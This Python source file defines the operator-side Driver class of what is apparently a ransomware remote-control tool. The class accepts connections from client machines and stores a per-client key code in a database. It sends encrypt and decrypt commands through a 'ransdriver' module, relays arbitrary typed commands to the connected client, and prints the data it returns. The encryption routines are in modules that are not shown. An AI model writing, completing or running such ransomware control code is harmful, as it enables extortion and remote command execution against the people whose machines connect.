from ._database import database_manager
from ._connection import connection
from ._crypto import cryptor
from ._ransdriver import ransdriver
from ._cparser import Command

#-------------------------------------- CLASS AND FUNCTIONS

class Driver:
    def __init__(self, prompt_manager):
        self._command = Command()
        self._cryptor = cryptor()
        self._connection_manager = connection(self._cryptor)
        self._database_manager = database_manager()
        self._prompt_manager = prompt_manager
        self._ransdriver = ransdriver(connection_manager=self._connection_manager,
                            database_manager=self._database_manager,
                            prompt_manager=self._prompt_manager)
        self._data = ''
        self.commands = {'encrypt': self._ransdriver.Encrypt,
                         'decrypt': self._ransdriver.Decrypt,
                         'help': self.__help,
                         'exit': self.close_connection}

    def make_connection(self):
        """
        Try to make a connection
        and send the initial values
        """
        self._prompt_manager.print('searching for a connection ...\n')
        self._connection_manager.make_connection()
        if self._connection_manager.connection_status:
            key_code = self._database_manager.config_database(self._connection_manager.client_name)
            self._connection_manager.send({'CODE': str(key_code).encode('utf-8')})
            self._prompt_manager.set_prompt(self._connection_manager.client_name, self._connection_manager.client_address)
            self._prompt_manager.print(f'connected to {self._connection_manager.client_name} on {self._connection_manager.client_address[0]}:{self._connection_manager.client_address[1]}\n')
    def run_command(self): 
        """
        Try to analyze the commands and run them
        """
        self._command = Command(self._prompt_manager.input())
        self._connection_manager.send({'COMMAND': self._command.encode('utf-8')})
        self._command.parse_command()
        
        if self._command.main_command.lower() in self.commands:
            self.commands[self._command.main_command.lower()](self._command.switches)
        else:
            self._data = self._connection_manager.receive_data('SENT_DATA').decode('utf-8')
            self._prompt_manager.print(self._data)
    
    def __help(self, arguments:dict):
        """
        shows the help for other commands
        """
        for command in arguments['command']:
            if command in self.commands:
                self._prompt_manager.print(f'help for command {command}:\n\n{self.commands[command].__doc__}')
            else:
                self._prompt_manager.print(f'Command {command} not found')
    
    def close_connection(self, arguments:dict):
        """
        Try to close the connection
        """
        self._database_manager.close_database()
        self._connection_manager.close_connection()
        self._prompt_manager.print(f'connection with {self._connection_manager.client_name} closed.')
